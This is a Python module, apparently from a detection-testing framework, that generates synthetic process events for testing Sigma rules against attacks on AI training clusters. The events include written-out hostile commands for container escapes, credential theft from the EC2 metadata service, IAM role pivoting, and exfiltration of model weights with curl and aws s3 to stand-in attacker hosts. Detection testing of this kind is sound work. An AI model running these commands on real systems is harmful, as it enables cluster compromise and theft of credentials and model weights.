"""Craftsman Agent: Frontier AI Lab Cloud & Compute Cluster Defense.

Models adversary tradecraft targeting frontier AI infrastructure:
1. Kubernetes / Container runtime privilege escalation & host breakouts.
2. EC2 Instance Metadata Service (IMDSv2) credential harvesting for GPU worker nodes.
3. Checkpoint storage reconnaissance (S3/GCS model checkpoint buckets).
4. Multi-gigabyte model weight parameter exfiltration (*.safetensors, multipart uploads).
"""

from __future__ import annotations

import uuid
from typing import List, Optional

from ..models import Variant
from .base import BaseCraftsman


class CloudClusterCraftsman(BaseCraftsman):
    """Specialized craftsman modeling threats against Frontier AI Lab training clusters & model weights."""

    def generate_variants(self, cycle: int, feedback: Optional[List[str]] = None) -> List[Variant]:
        variants: List[Variant] = []

        if cycle == 1:
            # Cycle 1: Container escapes & host-level breakout
            variants.append(
                Variant(
                    id=f"cloud-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="container_escape",
                    mutation_name="proc_k8s_nsenter_host_escape",
                    description="Container process executing nsenter targeting PID 1 to escape to GPU node host namespace",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/usr/bin/python3",
                        "Image": "/usr/bin/nsenter",
                        "CommandLine": "nsenter -t 1 -m -u -n -i /bin/bash",
                        "User": "root",
                    },
                    cycle=cycle,
                )
            )

            variants.append(
                Variant(
                    id=f"cloud-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="container_escape",
                    mutation_name="proc_docker_socket_privileged_spawn",
                    description="Abusing mounted docker.sock from worker pod to spawn privileged container mounting root filesystem",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/bin/sh",
                        "Image": "/usr/bin/docker",
                        "CommandLine": "docker -H unix:///var/run/docker.sock run --privileged -v /:/host-root alpine chroot /host-root",
                        "User": "root",
                    },
                    cycle=cycle,
                )
            )

            variants.append(
                Variant(
                    id=f"cloud-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="container_escape",
                    mutation_name="proc_cgroup_release_agent_escape",
                    description="Writing malicious script to cgroup release_agent for kernel-triggered host breakout",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/bin/bash",
                        "Image": "/bin/sh",
                        "CommandLine": "sh -c \"echo /tmp/escape.sh > /sys/fs/cgroup/release_agent\"",
                        "User": "root",
                    },
                    cycle=cycle,
                )
            )

        elif cycle == 2:
            # Cycle 2: IMDSv2 Token & Role Credential Theft
            variants.append(
                Variant(
                    id=f"cloud-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="imds_metadata_theft",
                    mutation_name="proc_imdsv2_session_token_request",
                    description="Acquiring session token from EC2 Instance Metadata Service (IMDSv2)",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/bin/bash",
                        "Image": "/usr/bin/curl",
                        "CommandLine": 'curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"',
                        "User": "root",
                    },
                    cycle=cycle,
                )
            )

            variants.append(
                Variant(
                    id=f"cloud-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="imds_metadata_theft",
                    mutation_name="proc_imdsv2_extract_role_credentials",
                    description="Extracting IAM security credentials for cluster worker node from IMDSv2",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/bin/bash",
                        "Image": "/usr/bin/curl",
                        "CommandLine": 'curl -s -H "X-aws-ec2-metadata-token: AQAECA..." "http://169.254.169.254/latest/meta-data/iam/security-credentials/ai-cluster-worker-role"',
                        "User": "root",
                    },
                    cycle=cycle,
                )
            )

            variants.append(
                Variant(
                    id=f"cloud-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="iam_pivot",
                    mutation_name="proc_aws_sts_assume_role_chain",
                    description="Using stolen worker node credentials to assume checkpoint storage access role",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/bin/bash",
                        "Image": "/usr/local/bin/aws",
                        "CommandLine": "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/ModelCheckpointAccessRole --role-session-name cluster-exfil",
                        "User": "ec2-user",
                    },
                    cycle=cycle,
                )
            )

        elif cycle == 3:
            # Cycle 3: Model Checkpoint Discovery & Weight Exfiltration
            variants.append(
                Variant(
                    id=f"cloud-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="storage_discovery",
                    mutation_name="proc_aws_s3_checkpoint_enumeration",
                    description="Reconnaissance of model checkpoint buckets seeking active epoch safetensors",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/bin/bash",
                        "Image": "/usr/local/bin/aws",
                        "CommandLine": "aws s3 ls s3://ai-training-checkpoints-prod/frontier-model-v3/ --recursive",
                        "User": "ec2-user",
                    },
                    cycle=cycle,
                )
            )

            variants.append(
                Variant(
                    id=f"cloud-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="exfiltration",
                    mutation_name="proc_aws_s3_multipart_weight_exfil",
                    description="Cross-account S3 multipart transfer exfiltrating 45GB model weight tensor",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/bin/bash",
                        "Image": "/usr/local/bin/aws",
                        "CommandLine": "aws s3 cp s3://ai-training-checkpoints-prod/frontier-model-v3/model.safetensors s3://attacker-exfil.stage.invalid/weights/model.safetensors --expected-size 45000000000",
                        "User": "ec2-user",
                    },
                    cycle=cycle,
                )
            )

            variants.append(
                Variant(
                    id=f"cloud-{uuid.uuid4().hex[:8]}",
                    target_type="sigma",
                    axis="exfiltration",
                    mutation_name="proc_curl_exfiltrate_checkpoint_slice",
                    description="Direct outbound curl streaming checkpoint tensor slice to external C2",
                    payload={
                        "EventID": 1,
                        "ParentImage": "/bin/bash",
                        "Image": "/usr/bin/curl",
                        "CommandLine": "curl -s -T /mnt/checkpoints/model-00001-of-00004.safetensors https://exfil.stage.invalid/upload",
                        "User": "root",
                    },
                    cycle=cycle,
                )
            )

        return variants
